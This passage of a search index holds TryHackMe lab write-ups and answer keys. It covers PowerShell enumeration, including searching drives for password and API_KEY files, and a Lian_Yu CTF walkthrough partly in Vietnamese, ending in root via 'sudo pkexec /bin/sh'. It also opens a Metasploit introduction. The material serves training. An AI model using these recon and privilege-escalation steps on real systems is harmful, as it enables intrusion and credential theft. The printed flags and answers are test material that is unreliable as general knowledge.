Administrator \\ Desktop > certutil -decode .\\ b64 . txt a . txt Input Length = 432 Output Length = 323 CertUtil : -decode command completed successfully . PS C :\\ Users \\ Administrator \\ Desktop > Get-Content a . txt this is the flag - ihopeyoudidthisonwindows the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage the rest is garbage","title":"Sort-Object"},{"location":"tryhackme/room/hacking-with-powershell/#task-4-enumeration","text":"Content The first step when you have gained initial access to any machine would be to enumerate. We'll be enumerating the following: users basic networking information file permissions registry permissions scheduled and running tasks insecure files Your task will be to answer the following questions to enumerate the machine using Powershell commands! Answer the questions below How many users are there on the machine? Answer Explain 5 Use Get-LocalUser command which I explained at What is the command to get the current working directory? question Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to? Answer Explain Guest Use Get-LocalUser | Select * command to showup full property. Then, filter output and get results. PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object sid -like * 501 * AccountExpires : Description : Built-in account for guest access to the computer / domain Enabled : False FullName : PasswordChangeableDate : PasswordExpires : UserMayChangePassword : False PasswordRequired : False PasswordLastSet : LastLogon : Name : Guest SID : S - 1 - 5 - 21 - 1394777289 - 3961777894 - 1791813945 - 501 PrincipalSource : Local ObjectClass : User How many users have their password required values set to False? Answer Explain 4 Filter, filter, filter,... PS C :\\ Users \\ Administrator \\ Desktop > get-localuser | select * | where-object passwordrequired -match false | measure Count : 4 Average : Sum : Maximum : Minimum : Property : How many local groups exist? Answer Explain 24 Use get-command | where name -like *group* | where name -like *local* to file cmdlet, and filter then. PS C :\\ Users \\ Administrator \\ Desktop > get-command | where-object name -like * group * | where-object name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-command | where name -like * group * | where name -like * local * CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Add-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Get-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet New-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Remove-LocalGroupMember 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Rename-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts Cmdlet Set-LocalGroup 1 . 0 . 0 . 0 Microsoft . PowerShell . LocalAccounts PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup Name Description ---- ----------- Access Control Assistance Operators Members of this group can remotely query authorization attributes and permission ... Administrators Administrators have complete and unrestricted access to the computer / domain Backup Operators Backup Operators can override security restrictions for the sole purpose of back ... Certificate Service DCOM Access Members of this group are allowed to connect to Certification Authorities in the ... Cryptographic Operators Members are authorized to perform cryptographic operations . Distributed COM Users Members are allowed to launch , activate and use Distributed COM objects on this ... Event Log Readers Members of this group can read event logs from local machine Guests Guests have the same access as members of the Users group by default , except for ... Hyper-V Administrators Members of this group have complete and unrestricted access to all features of H ... IIS_IUSRS Built-in group used by Internet Information Services . Network Configuration Operators Members in this group can have some administrative privileges to manage configur ... Performance Log Users Members of this group may schedule logging of performance counters , enable trace ... Performance Monitor Users Members of this group can access performance counter data locally and remotely Power Users Power Users are included for backwards compatibility and possess limited adminis ... Print Operators Members can administer printers installed on domain controllers RDS Endpoint Servers Servers in this group run virtual machines and host sessions where users RemoteA ... RDS Management Servers Servers in this group can perform routine administrative actions on servers runn ... RDS Remote Access Servers Servers in this group enable users of RemoteApp programs and personal virtual de ... Remote Desktop Users Members in this group are granted the right to logon remotely Remote Management Users Members of this group can access WMI resources over management protocols ( such a ... Replicator Supports file replication in a domain Storage Replica Administrators Members of this group have complete and unrestricted access to all features of S ... System Managed Accounts Group Members of this group are managed by the system . Users Users are prevented from making accidental or intentional system-wide changes an ... PS C :\\ Users \\ Administrator \\ Desktop > get-localgroup | measure Count : 24 Average : Sum : Maximum : Minimum : Property : What command did you use to get the IP address info? Answer Explain Get-NetIPAddress Use Get-Command | Where-Object -property name -like \"*ip*\" | where-object -property Name -like \"*address*\" to find cmdlets. How many ports are listed as listening? Answer Explain 20 Use this command: get-nettcpconnection | where state -match listen | measure What is the remote address of the local port listening on port 445? Answer Explain :: Use this command: get-nettcpconnection | where localport -match 445 How many patches have been applied? Answer Explain 20 Use this command: get-hostfix When was the patch with ID KB4023834 installed? Answer Explain 6 / 15 / 2017 12 : 00 : 00 AM Use this command: get-hostfix | where hostfixID -match KB4023834 Find the contents of a backup file. Answer Explain backpassflag First, you must find backup (in window, it has the extension .bak ). Find it by get-childitem -path C:\\ -include *.bak* -file -recurse -erroraction silentlycontinue Second, read it PS C :\\ Users \\ Administrator > more 'C:\\Program Files (x86)\\Internet Explorer\\passwords.bak.txt' backpassflag Search for all files containing API_KEY Answer Explain fakekey123 Use this command to solve: get-childitem -path c :\\* -recurse -erroraction silentlycontinue | select-string -pattern API_KEY What command do you do to list all the running processes? Answer Explain Get-Process Find cmdlet by using get-command command and filter What is the path of the scheduled task called new-sched-task? Answer Explain / Find command that it provides schedule task: get-command | where name -like *schedule* . You will see get-scheduledtask , this is the command to look for. Then, filter output and get result. PS C :\\ Users \\ Administrator > get-scheduledtask | where taskname -like * new * TaskPath TaskName State -------- -------- ----- \\ new-sched -task Ready Who is the owner of the C:\\? Answer Explain NT SERVICE \\ TrustedInstaller To get owner of X (path_of_folder/path_of_file), use Get-Acl command . Full syntax to solve: PS C :\\ Users \\ Administrator \\ Desktop > get-acl C :\\ Directory : Path Owner Access ---- ----- ------ C :\\ NT SERVICE \\ TrustedInstaller CREATOR OWNER Allow 268435456 ...","title":"Task 4:  Enumeration"},{"location":"tryhackme/room/hacking-with-powershell/#task-5-basic-scripting-challenge","text":"Now that we have run Powershell commands, let's try to write and run a script to do more complex and powerful actions. For this ask, we'll use Powershell ISE (the Powershell Text Editor). Let's use a particular scenario to show an example of this script. Given a list of port numbers, we want to use this list to see if the local port is listening. Open the listening-ports.ps1 script on the Desktop using Powershell ISE. Powershell scripts usually have the .ps1 file extension. $system_ports = Get-NetTCPConnection -State Listen $text_port = Get-Content -Path C :\\ Users \\ Administrator \\ Desktop \\ ports . txt foreach ( $port in $text_port ){ if ( $port -in $system_ports . LocalPort ){ echo $port } } On the first line, we want to get a list of all the ports on the system that are listening. We do this using the Get-NetTCPConnection cmdlet. We are then saving the output of this cmdlet into a variable. The convention to create variables is used as: $variable_name = value In the following line, we want to read a list of ports from the file. We do this using the Get-Content cmdlet. Again, we store this output in the variables. The simplest next step is to iterate through all the ports in the file to see if the ports are listening. To iterate through the ports in the file, we use the following: foreach ( $new_var in $existing_var ){} This particular code block is used to loop through a set of objects. Once we have each individual port, we want to check if this port occurs in the listening local ports. Instead of doing another for loop, we just use an if statement with the -in operator to check if the port exists in the LocalPort property of any object. A full list of if statement comparison operators can be found here. To run the script, call the script path using Powershell or click the green button on Powershell ISE: Now that we've seen what a basic script looks like - it's time to write one of your own. The emails folder on the Desktop contains copies of the emails John, Martha, and Mary have been sending to each other(and themselves). Answer the following questions with regard to these emails (try not to open the files and use a script to answer the questions). Scripting may be a bit difficult, but here is a good resource to use: Answer the questions below What file contains the password Answer Explain Doc3M We use select-string -pattern password command to solve this chall. Let's try it with each file. Full command powershell get-childitem -path .\\emails\\ -file -recurse | select-string -pattern password What is the password? Answer Explain johnisalegend99 What files contains an HTTPS link? Answer Explain Doc2Mary","title":"Task 5: Basic Scripting Challenge"},{"location":"tryhackme/room/hacking-with-powershell/#task-6-intermediate-scripting","text":"Content Now that you've learnt a little bit about how scripting works - let's try something a bit more interesting. Sometimes we may not have utilities like Nmap and Python available, and we are forced to write scripts to do very rudimentary tasks. Why don't you try writing a simple port scanner using Powershell? Here's the general approach to use: Determine IP ranges to scan(in this case it will be localhost) and you can provide the input in any way you want Determine the port ranges to scan Determine the type of scan to run(in this case it will be a simple TCP Connect Scan) Answer the questions below How many open ports did you find between 130 and 140(inclusive of those two)? Answer Explain 11 Use Test-Netconnection command to test connection. Script script.ps1 for ( $i = 130 ; i -le 140 ; $i ++){ test-connection localhost -port $i }","title":"Task 6: Intermediate Scripting"},{"location":"tryhackme/room/hacking-with-powershell/#more","text":"Operator in powershell: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.3&viewFallbackFrom=powershell-6 Script file: https://learnxinyminutes.com/docs/powershell/ Full command: https://learn.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.3&viewFallbackFrom=powershell-7","title":"More"},{"location":"tryhackme/room/hacking-with-powershell/tmp/","text":"Content Explain Answer the questions below Learn about password attacking techniques in the next task! Answer Explain No needed answer The image describes the result","title":"Tmp"},{"location":"tryhackme/room/intro-c2/","tags":["THM-Intro C2"],"text":"TryHackMe - Intro to C2 \u00b6 Task 1: Introduction \u00b6","title":"TryHackMe - Intro to C2"},{"location":"tryhackme/room/intro-c2/#tryhackme-intro-to-c2","text":"","title":"TryHackMe - Intro to C2"},{"location":"tryhackme/room/intro-c2/#task-1-introduction","text":"","title":"Task 1: Introduction"},{"location":"tryhackme/room/lianyu/","tags":["THM-CTF"],"text":"Lian_Yu \u00b6 See room in https://tryhackme.com/room/lianyu Task 1: Find the Flags \u00b6 Answer the questions below Deploy the VM and Start the Enumeration Answer No needed answer What is the Web Directory you found? Answer 2100 What is the file name you found? Answer green_arrow . ticket What is the FTP Password? Answer ! #th3h00d What is the file name with SSH password? Answer shado user.txt Answer THM { P30P7E_K33P_53CRET5__C0MPUT3R5_D0N ' T } root.txt Answer THM { MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I ' LL_BE_D34D } Explanation and attack scenario \u00b6 First, we will test some basic things in this website first such as port test (scan port through nmap), url test (gobuster, wfuzz,...) With nmap, you should consider it because it's extremely noisy. I will use Vietnamese to present. \u0110\u1ecba ch\u1ec9 ip c\u1ee7a website: 10.10.254.149 \u0110\u1ea7u ti\u00ean ta ti\u1ebfn h\u00e0nh scan website xem c\u00e1c service tr\u01b0\u1edbc: -sV -sT -sC -vv 10.10.254.149 Ta \u0111\u01b0\u1ee3c k\u1ebft qu\u1ea3 scan port nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi: Ch\u00fa \u00fd \u0111\u1ebfn Terminal PORT STATE SERVICE REASON VERSION 21 / tcp open ftp syn-ack vsftpd 3 . 0 . 2 22 / tcp open ssh syn-ack OpenSSH 6 . 7p1 Debian 5 + deb8u8 ( protocol 2 . 0 ) | ssh-hostkey : | 1024 5650bd11efd4ac5632c3ee733ede87f4 ( DSA ) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T + pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV + d35X8CTUM882eJX + t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs / y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54 / tI5s6i4Tfpah2k + fnkLzX74fONcAEqseZDOffn5bxS + nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv + hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A + HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg == | 2048 396f3a9cb62dad0cd86dbe77130725d6 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww + oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5 / bDtgOnzfd + 70Rul + G7Ch0uzextmZh7756 / VrqKn + rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm / YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z + EfuCAfvMe0hxtrbHlb + VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini + VzDhXal1H7l / HkQJKw9NSUJXOtLjWKlU4l +/ xEkXPxZ | 256 a66996d76d6127967ebb9f83601b5212 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2 + e / xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf + QRtxvjnqRg = | 256 3f437675a85aa6cd33b066420491fea0 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E / Fn 80 / tcp open http syn-ack Apache httpd Ta th\u1ea5y \u0111\u01b0\u1ee3c 3 port, 1 cho ssh, 1 ftp v\u00e0 1 http. \u0110\u00e2y c\u00f3 v\u1ebb l\u00e0 th\u00f4ng tin ta c\u1ea7n. Ti\u1ebfp theo, ta b\u1eaft \u0111\u1ea7u t\u00ecm ki\u1ebfm url b\u1eb1ng gobuster. Ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111\u01b0\u1eddng d\u1eabn \u0111\u1ebfn file 2100 Ta t\u00ecm \u0111\u01b0\u1ee3c url http://10.10.254.149/island c\u00f3 n\u1ed9i dung tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y: \u0110\u1ec3 \u00fd ch\u00fat x\u00edu th\u00ec trang n\u00e0y ch\u1ee9a th\u00f4ng tin b\u1ed5 \u00edch cho ch\u00fang ta \u0111\u00ea\u00ed. H\u1ecd b\u1ea3o h\u00e3y d\u00f9ng word g\u00ec \u0111\u00f3 \u0111\u1ec3 \u0111\u1ebfn \u0111\u01b0\u1ee3c LianYu th\u00ec ch\u1eafc l\u00e0 username cho ftp hay ssh g\u00ec \u0111\u00f3 ro\u00e0i. Ta xem source code th\u00ec nh\u1eadn \u0111\u01b0\u1ee3c m\u00e3 vigilante \u0111\u01b0\u1ee3c \u0111\u00e1nh color white t\u1eeb \u0111\u1ea7u. B\u1ea3o sao ::). Ti\u1ebfp t\u1ee5c gobuster \u0111\u1ec3 qu\u00e9t url... Xem source code c\u1ee7a website m\u1edbi ta th\u1ea5y c\u00f3 1 d\u00f2ng command v\u1ec1 file c\u00f3 extension l\u00e0 .ticket. Ti\u1ebfp t\u1ee5c d\u00f9ng gobuster v\u00e0 ta t\u00ecm \u0111\u01b0\u1ee3c file green_arrow.ticket . N\u1ed9i dung file m\u00f4 t\u1ea3 l\u00e0 token c\u1ee7a Queen's Gambit(Ship) \u0110\u00e2y l\u00e0 1 password \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a theo base58. Sau khi gi\u1ea3i m\u00e3, ta \u0111\u01b0\u1ee3c flag: !#th3h00d. B\u00e2y gi\u1edd \u0111\u00e3 \u0111\u1ee7: username = vigilante password = !#th3h00d Ta th\u1eed th\u00ec \u0111\u00e2y ch\u00ednh l\u00e0 th\u00f4ng tin \u0111\u1ec3 login ftp. Ro\u00e0i, login th\u00f4i V\u00e0 xem, ta c\u00f3 g\u00ec n\u00e0o, 3 file \u1ea3nh. Ta s\u1ebd get n\u00f3 v\u1ec1 m\u00e1y v\u00e0 xem th\u00ec ph\u00e1t hi\u1ec7n file \u1ea3nh Leave_me_alone.png m\u1eb7c d\u00f9 \u0111\u00fang extension nh\u01b0ng m\u00e3 hex b\u1ecb sai l\u00e0m cho vi\u1ec7c xem \u1ea3nh tr\u1edf n\u00ean kh\u00f4ng th\u1ec3. Ta s\u1ebd ch\u1ec9nh l\u1ea1i hex b\u1eb1ng th\u00f4ng tin tr\u00ean wiki V\u00e0 ta \u0111\u00e3 th\u1ea5y th\u00f4ng tin tr\u00ean \u1ea3nh Ch\u1ea3 c\u00f3 g\u00ec \u1edf tr\u1ecfng :). Osint ti\u1ebfp c\u00e1c file \u1ea3nh kh\u00e1c th\u00f4i Nh\u1eadn th\u1ea5y file aa.jpg nh\u01b0 file r\u00e1c g\u00ec \u0111\u00f3, ch\u1eafc h\u1eb5n l\u00e0 fiel ch\u1ee9a d\u1eef li\u1ec7u \u1ea9n gi\u1ea5u, ta d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 xem file \u1ea9n. \u1ede \u0111\u00e2y t\u00f4i d\u00f9ng stegseek -sf aa.jpg v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file shado ch\u1ee9a password, \u0111\u00e2y l\u00e0 flag c\u1ea7n t\u00ecm. Login ssh v\u1edbi user slade, ta s\u1ebd xem \u0111\u01b0\u1ee3c file user.txt. Ti\u1ebfp theo, ki\u1ec3m tra quy\u1ec1n c\u1ee7a slade b\u1eb1ng sudo -l v\u00e0 \u0111\u00e2y b\u1ecb l\u1ed7i leo thang \u0111\u1eb7c quy\u1ec1n pkexec \u0111\u01b0\u1ee3c ph\u00e9p s\u1eed d\u1ee5ng sudo. Ta s\u1ebd ti\u1ebfn h\u00e0nh leo thang \u0111\u1eb7c quy\u1ec1n b\u1eb1ng sudo pkexec /bin/sh v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c quy\u1ec1n root.","title":"Lian_Yu"},{"location":"tryhackme/room/lianyu/#lian_yu","text":"See room in https://tryhackme.com/room/lianyu","title":"Lian_Yu"},{"location":"tryhackme/room/lianyu/#task-1-find-the-flags","text":"Answer the questions below Deploy the VM and Start the Enumeration Answer No needed answer What is the Web Directory you found? Answer 2100 What is the file name you found? Answer green_arrow . ticket What is the FTP Password? Answer ! #th3h00d What is the file name with SSH password? Answer shado user.txt Answer THM { P30P7E_K33P_53CRET5__C0MPUT3R5_D0N ' T } root.txt Answer THM { MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I ' LL_BE_D34D }","title":"Task 1: Find the Flags"},{"location":"tryhackme/room/lianyu/#explanation-and-attack-scenario","text":"First, we will test some basic things in this website first such as port test (scan port through nmap), url test (gobuster, wfuzz,...) With nmap, you should consider it because it's extremely noisy. I will use Vietnamese to present. \u0110\u1ecba ch\u1ec9 ip c\u1ee7a website: 10.10.254.149 \u0110\u1ea7u ti\u00ean ta ti\u1ebfn h\u00e0nh scan website xem c\u00e1c service tr\u01b0\u1edbc: -sV -sT -sC -vv 10.10.254.149 Ta \u0111\u01b0\u1ee3c k\u1ebft qu\u1ea3 scan port nh\u01b0 h\u00ecnh b\u00ean d\u01b0\u1edbi: Ch\u00fa \u00fd \u0111\u1ebfn Terminal PORT STATE SERVICE REASON VERSION 21 / tcp open ftp syn-ack vsftpd 3 . 0 . 2 22 / tcp open ssh syn-ack OpenSSH 6 . 7p1 Debian 5 + deb8u8 ( protocol 2 . 0 ) | ssh-hostkey : | 1024 5650bd11efd4ac5632c3ee733ede87f4 ( DSA ) | ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T + pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV + d35X8CTUM882eJX + t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs / y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54 / tI5s6i4Tfpah2k + fnkLzX74fONcAEqseZDOffn5bxS + nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv + hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A + HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg == | 2048 396f3a9cb62dad0cd86dbe77130725d6 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww + oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5 / bDtgOnzfd + 70Rul + G7Ch0uzextmZh7756 / VrqKn + rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm / YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z + EfuCAfvMe0hxtrbHlb + VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini + VzDhXal1H7l / HkQJKw9NSUJXOtLjWKlU4l +/ xEkXPxZ | 256 a66996d76d6127967ebb9f83601b5212 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2 + e / xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf + QRtxvjnqRg = | 256 3f437675a85aa6cd33b066420491fea0 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E / Fn 80 / tcp open http syn-ack Apache httpd Ta th\u1ea5y \u0111\u01b0\u1ee3c 3 port, 1 cho ssh, 1 ftp v\u00e0 1 http. \u0110\u00e2y c\u00f3 v\u1ebb l\u00e0 th\u00f4ng tin ta c\u1ea7n. Ti\u1ebfp theo, ta b\u1eaft \u0111\u1ea7u t\u00ecm ki\u1ebfm url b\u1eb1ng gobuster. Ta nh\u1eadn \u0111\u01b0\u1ee3c \u0111\u01b0\u1eddng d\u1eabn \u0111\u1ebfn file 2100 Ta t\u00ecm \u0111\u01b0\u1ee3c url http://10.10.254.149/island c\u00f3 n\u1ed9i dung tr\u00f4ng nh\u01b0 th\u1ebf n\u00e0y \u0111\u00e2y: \u0110\u1ec3 \u00fd ch\u00fat x\u00edu th\u00ec trang n\u00e0y ch\u1ee9a th\u00f4ng tin b\u1ed5 \u00edch cho ch\u00fang ta \u0111\u00ea\u00ed. H\u1ecd b\u1ea3o h\u00e3y d\u00f9ng word g\u00ec \u0111\u00f3 \u0111\u1ec3 \u0111\u1ebfn \u0111\u01b0\u1ee3c LianYu th\u00ec ch\u1eafc l\u00e0 username cho ftp hay ssh g\u00ec \u0111\u00f3 ro\u00e0i. Ta xem source code th\u00ec nh\u1eadn \u0111\u01b0\u1ee3c m\u00e3 vigilante \u0111\u01b0\u1ee3c \u0111\u00e1nh color white t\u1eeb \u0111\u1ea7u. B\u1ea3o sao ::). Ti\u1ebfp t\u1ee5c gobuster \u0111\u1ec3 qu\u00e9t url... Xem source code c\u1ee7a website m\u1edbi ta th\u1ea5y c\u00f3 1 d\u00f2ng command v\u1ec1 file c\u00f3 extension l\u00e0 .ticket. Ti\u1ebfp t\u1ee5c d\u00f9ng gobuster v\u00e0 ta t\u00ecm \u0111\u01b0\u1ee3c file green_arrow.ticket . N\u1ed9i dung file m\u00f4 t\u1ea3 l\u00e0 token c\u1ee7a Queen's Gambit(Ship) \u0110\u00e2y l\u00e0 1 password \u0111\u01b0\u1ee3c m\u00e3 h\u00f3a theo base58. Sau khi gi\u1ea3i m\u00e3, ta \u0111\u01b0\u1ee3c flag: !#th3h00d. B\u00e2y gi\u1edd \u0111\u00e3 \u0111\u1ee7: username = vigilante password = !#th3h00d Ta th\u1eed th\u00ec \u0111\u00e2y ch\u00ednh l\u00e0 th\u00f4ng tin \u0111\u1ec3 login ftp. Ro\u00e0i, login th\u00f4i V\u00e0 xem, ta c\u00f3 g\u00ec n\u00e0o, 3 file \u1ea3nh. Ta s\u1ebd get n\u00f3 v\u1ec1 m\u00e1y v\u00e0 xem th\u00ec ph\u00e1t hi\u1ec7n file \u1ea3nh Leave_me_alone.png m\u1eb7c d\u00f9 \u0111\u00fang extension nh\u01b0ng m\u00e3 hex b\u1ecb sai l\u00e0m cho vi\u1ec7c xem \u1ea3nh tr\u1edf n\u00ean kh\u00f4ng th\u1ec3. Ta s\u1ebd ch\u1ec9nh l\u1ea1i hex b\u1eb1ng th\u00f4ng tin tr\u00ean wiki V\u00e0 ta \u0111\u00e3 th\u1ea5y th\u00f4ng tin tr\u00ean \u1ea3nh Ch\u1ea3 c\u00f3 g\u00ec \u1edf tr\u1ecfng :). Osint ti\u1ebfp c\u00e1c file \u1ea3nh kh\u00e1c th\u00f4i Nh\u1eadn th\u1ea5y file aa.jpg nh\u01b0 file r\u00e1c g\u00ec \u0111\u00f3, ch\u1eafc h\u1eb5n l\u00e0 fiel ch\u1ee9a d\u1eef li\u1ec7u \u1ea9n gi\u1ea5u, ta d\u00f9ng c\u00e1c c\u00f4ng c\u1ee5 \u0111\u1ec3 xem file \u1ea9n. \u1ede \u0111\u00e2y t\u00f4i d\u00f9ng stegseek -sf aa.jpg v\u00e0 t\u00ecm \u0111\u01b0\u1ee3c file shado ch\u1ee9a password, \u0111\u00e2y l\u00e0 flag c\u1ea7n t\u00ecm. Login ssh v\u1edbi user slade, ta s\u1ebd xem \u0111\u01b0\u1ee3c file user.txt. Ti\u1ebfp theo, ki\u1ec3m tra quy\u1ec1n c\u1ee7a slade b\u1eb1ng sudo -l v\u00e0 \u0111\u00e2y b\u1ecb l\u1ed7i leo thang \u0111\u1eb7c quy\u1ec1n pkexec \u0111\u01b0\u1ee3c ph\u00e9p s\u1eed d\u1ee5ng sudo. Ta s\u1ebd ti\u1ebfn h\u00e0nh leo thang \u0111\u1eb7c quy\u1ec1n b\u1eb1ng sudo pkexec /bin/sh v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c quy\u1ec1n root.","title":"Explanation and attack scenario"},{"location":"tryhackme/room/metasploit/","tags":["Intro Metasploit"],"text":"TryHackMe - Metasploit \u00b6 Metasploit is the most widely used exploitation framework. Learn how to use it and unlock its full potential. The Metasploit framework is a set of open-source tools used for network enumeration, identifying vulnerabilities, developing payloads and executing exploit code against remote target machines. Get hands-on with the various tool and features Metasploit provides, from exploit development to post-exploitation techniques, this module covers it all. Task 1: Introduction to Metasploit \u00b6 Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation. Metasploit has two main versions: Metasploit Pro : The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI). Metasploit Framework : The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions. The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development. The main components of the Metasploit Framework can be summarized as follows; msfconsole : The main command-line interface. Modules : supporting modules such as exploits, scanners, payloads, etc. Tools : Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module. This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably. You can deploy and use the AttackBox to complete tasks and answer the questions. Answer the questions below No answer needed Answer Explain No answer needed No answer needed Task 2: Main Components of Metasploit \u00b6 While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the msfconsole command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack. Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload. Exploit : A piece of code that uses a vulnerability present on the target system. Vulnerability : A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system. Payload : An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target 